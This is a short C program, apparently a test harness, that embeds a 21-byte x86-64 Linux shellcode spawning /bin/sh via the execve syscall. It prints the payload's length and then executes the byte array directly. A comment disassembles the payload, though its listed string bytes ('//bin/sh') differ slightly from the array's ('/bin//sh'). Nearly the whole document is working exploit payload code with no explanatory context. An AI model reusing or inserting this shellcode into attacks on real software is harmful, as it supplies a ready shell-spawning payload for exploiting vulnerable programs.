char code[] = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x99\xb0\x3b\x0f\x05";
int main() {
    /*
        asm:
            0:  31 f6                   xor    esi,esi
            2:  48 bb 2f 2f 62 69 6e    movabs rbx,0x68732f6e69622f2f
            9:  2f 73 68
            c:  56                      push   rsi
            d:  53                      push   rbx
            e:  54                      push   rsp
            f:  5f                      pop    rdi
            10: 99                      cdq
            11: b0 3b                   mov    al,0x3b
            13: 0f 05                   syscall
    */
        printf("len:%d bytes\n", strlen(code));
        (*(void(*)()) code)();
        return 0;
}